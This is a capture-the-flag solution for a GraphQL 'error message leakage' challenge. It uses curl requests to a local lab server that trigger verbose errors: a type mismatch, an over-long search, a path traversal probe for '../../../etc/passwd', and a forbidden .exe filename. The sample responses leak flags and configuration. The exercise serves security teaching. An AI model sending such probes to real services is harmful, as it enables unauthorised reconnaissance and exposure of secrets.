# Solution: Error Message Leakage

## Overview

This challenge demonstrates how verbose error messages in GraphQL applications can leak sensitive information including flags, database schemas, and internal configuration details.

## Step 1: Reconnaissance

Explore the normal API functionality:

```bash
curl -X POST http://localhost:8003/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { users { id username email } }"
  }'
```

Notice the API has user lookup and file access capabilities.

## Step 2: Vulnerability Identification

The API has several input validation points that leak sensitive data in error messages. Test different error conditions:

**Type validation error:**
```bash
curl -X POST http://localhost:8003/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { userById(id: \"invalid_string\") { id username } }"
  }'
```

This triggers a type validation error because `id` expects an integer but receives a string.

## Step 3: Exploitation

There are multiple ways to trigger errors that leak the flag:

**Method 1 - Type mismatch:**
```bash
curl -X POST http://localhost:8003/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { userById(id: \"not_a_number\") { id username } }"
  }'
```

**Method 2 - Search query length validation:**
```bash
curl -X POST http://localhost:8003/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { searchUsers(query: \"this_is_a_very_long_search_query_that_exceeds_the_fifty_character_limit\") { id } }"
  }'
```

**Method 3 - Path traversal detection:**
```bash
curl -X POST http://localhost:8003/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { fileByName(filename: \"../../../etc/passwd\") { id filename } }"
  }'
```

**Method 4 - Forbidden file extension:**
```bash
curl -X POST http://localhost:8003/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { fileByName(filename: \"malicious.exe\") { id filename } }"
  }'
```

## Step 4: Flag Retrieval

Each exploitation method returns an error message with debug information containing the flag. The exact formats are:

**Method 1 - Type mismatch response:**
```
Type validation failed: invalid literal for int() with base 10: 'not_a_number' [DEBUG: FLAG=HC{...}, INPUT_TYPE=string, EXPECTED_TYPE=integer, USER_TABLE=users]
```

**Method 2 - Search query length response:**
```
Search query too long: 71 characters [LIMIT: 50, FLAG=HC{...}, MAX_SEARCH_LENGTH=50]
```

**Method 3 - Path traversal response:**
```
File system error: Path traversal detected: ../../../etc/passwd [SECURITY_FLAG=HC{...}, BLOCKED_PATTERNS=../, ..] [INTERNAL: FLAG=HC{...}, FILE_SYSTEM=virtual, ACCESS_MODE=read]
```

**Method 4 - Forbidden extension response:**
```
File system error: Dangerous file type: malicious.exe [CONFIG_FLAG=HC{...}, ALLOWED_EXTENSIONS=txt,sql,json] [INTERNAL: FLAG=HC{...}, FILE_SYSTEM=virtual, ACCESS_MODE=read]
```

The flag follows the format: `HC{...}`
